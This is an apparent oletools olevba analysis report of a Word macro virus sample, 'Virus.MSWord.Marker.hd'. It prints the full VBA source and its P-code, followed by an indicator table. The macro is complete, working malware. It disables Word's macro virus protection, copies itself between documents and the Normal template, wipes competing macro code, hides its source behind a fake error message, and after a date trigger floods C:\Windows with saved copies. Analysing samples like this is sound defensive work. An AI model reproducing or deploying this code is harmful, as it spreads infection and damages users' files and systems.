olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ViewVBcode(): MsgBox "The Visual Basic environment could not be initialized. Please run setup to install it correctly.", vbCritical: End Sub

Private Sub ComboBox1_Change()

End Sub

Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xxa"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or plainfec = False Then
         If DInfec = True And plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.AddFromString contemodu
         End If

         If DInfec = False And plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.AddFromString contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True And plainfec = False Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("*.*" & i & "*.doc"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
   
  Next
  End If
  
  GoTo Finb
  
Finm:
  On Error Resume Next
  For il = 1 To Docu.CodeModule.CountOfLines
    Docu.CodeModule.DeleteLines 1
  Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub
Private Sub Document_Open()
   On Error Resume Next
   Const exi = "la macro de colombia xxx"
   Dim Docu, Plan As Object
   Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
   If Docu.CodeModule.CountOfLines > 0 Then
     DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If DInfec = False Then
        For il = 1 To Docu.CodeModule.CountOfLines
        Docu.CodeModule.DeleteLines 1
      Next
     End If
   End If

   Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
   If Plan.CodeModule.CountOfLines > 0 Then
     plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If plainfec = False Then
        For il = 1 To Plan.CodeModule.CountOfLines
        Plan.CodeModule.DeleteLines 1
      Next
     End If
   End If
End Sub
























Private Sub ToggleButton1_Click()

End Sub

Private Sub SpinButton1_Change()

End Sub

Private Sub Image1_Click()

End Sub































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.hd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11703 bytes
' Line #0:
' 	FuncDefn (Private Sub ViewVBcode())
' 	BoS 0x0000 
' 	LitStr 0x0060 "The Visual Basic environment could not be initialized. Please run setup to install it correctly."
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub ComboBox1_Change())
' Line #3:
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_close())
' Line #7:
' Line #8:
' 	OnError Finm 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0018 "la macro de colombia xxa"
' 	VarDefn exi
' Line #11:
' 	Dim 
' 	VarDefn DInfec
' 	VarDefn planinfec (As Boolean)
' Line #12:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #13:
' 	Dim 
' 	VarDefn modulin
' 	VarDefn contemodu
' 	VarDefn Ninfec (As String)
' Line #14:
' 	Dim 
' 	VarDefn Nume (As Integer)
' Line #15:
' 	Dim 
' 	VarDefn Copform (As Object)
' Line #16:
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #20:
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #22:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Saveplan 
' Line #23:
' Line #24:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #25:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St plainfec 
' Line #26:
' Line #27:
' 	QuoteRem 0x0006 0x0012 "Ninfec = "'" & " ""
' Line #28:
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #30:
' Line #31:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Nume 
' Line #32:
' 	Ld Nume 
' 	St Nume 
' Line #33:
' 	LitDI2 0x0007 
' 	St nume1 
' Line #34:
' 	LitDI2 0x0003 
' 	St Nume2 
' Line #35:
' 	Ld Nume 
' 	Ld nume1 
' 	Eq 
' 	Ld Nume 
' 	Ld Nume2 
' 	Eq 
' 	Or 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #36:
' 	Ld DInfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	OnError Finm 
' Line #42:
' 	QuoteRem 0x000C 0x0024 "Docu.CodeModule.addfromstring Ninfec"
' Line #43:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #44:
' 	Ld contemodu 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	OnError Finm 
' Line #53:
' 	QuoteRem 0x000B 0x0024 "Plan.CodeModule.addfromstring Ninfec"
' Line #54:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #55:
' 	Ld contemodu 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #59:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	St sd 
' Line #63:
' 	Ld sd 
' 	ArgsLd Trim 0x0001 
' 	St sd 
' Line #64:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #65:
' 	LitStr 0x000B "C:\Windows\"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #66:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC9F7 0x3B9A 
' 	For 
' Line #67:
' 	LineCont 0x0010 0F 00 08 00 1B 00 08 00 27 00 08 00 31 00 08 00
' 	LitStr 0x0003 "*.*"
' 	Ld i 
' 	Concat 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Paren 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #68:
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	GoTo Finb 
' Line #73:
' Line #74:
' 	Label Finm 
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #78:
' 	StartForVariable 
' 	Next 
' Line #79:
' 	GoTo Finb 
' Line #80:
' 	Label Finb 
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Private Sub Document_Open())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	Dim (Const) 
' 	LitStr 0x0018 "la macro de colombia xxx"
' 	VarDefn exi
' Line #86:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #88:
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #89:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #90:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #92:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #93:
' 	StartForVariable 
' 	Next 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #98:
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #99:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St plainfec 
' Line #100:
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #102:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	FuncDefn (Private Sub ToggleButton1_Click())
' Line #132:
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' 	FuncDefn (Private Sub SpinButton1_Change())
' Line #136:
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Private Sub Image1_Click())
' Line #140:
' Line #141:
' 	EndSub 
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |ToggleButton1_Click |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ComboBox1_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

